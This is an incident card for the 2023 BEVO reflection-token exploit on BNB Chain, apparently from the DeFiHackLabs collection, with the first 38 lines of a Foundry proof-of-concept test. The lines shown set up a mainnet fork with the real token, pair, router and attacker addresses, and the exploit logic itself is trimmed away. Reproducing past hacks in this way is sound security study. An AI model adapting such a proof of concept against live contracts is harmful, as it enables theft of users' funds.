# [?] - BEVO - Reflection token

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BEVO
Published: 2023-01-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/BEVO_exp.sol
Type: defi-exploit-poc

## Details
Lost: 144 BNB
References:
- https://twitter.com/QuillAudits/status/1620377951836708865

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Total lost: 144 BNB
// Frontrunner: https://bscscan.com/address/0xd3455773c44bf0809e2aeff140e029c632985c50
// Original Attacker: https://bscscan.com/address/0x68fa774685154d3d22dec195bc77d53f0261f9fd
// Frontrunner Contract: https://bscscan.com/address/0xbec576e2e3552f9a1751db6a4f02e224ce216ac1
// Original Attack Contract: https://bscscan.com/address/0xbf7fc9e12bcd08ec7ef48377f2d20939e3b4845d
// Vulnerable Contract: https://bscscan.com/address/0xc6cb12df4520b7bf83f64c79c585b8462e18b6aa
// Attack Tx: https://bscscan.com/tx/0xb97502d3976322714c828a890857e776f25c79f187a32e2d548dda1c315d2a7d

// @Analysis
// https://twitter.com/QuillAudits/status/1620377951836708865

contract BEVOExploit is Test {
    IERC20 private constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
    IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_230_702);

        cheats.label(address(wbnb), "WBNB");
        cheats.label(address(bevo), "BEVO");
        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
        cheats.label(address(router), "PancakeRouter");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/BEVO_exp.sol_
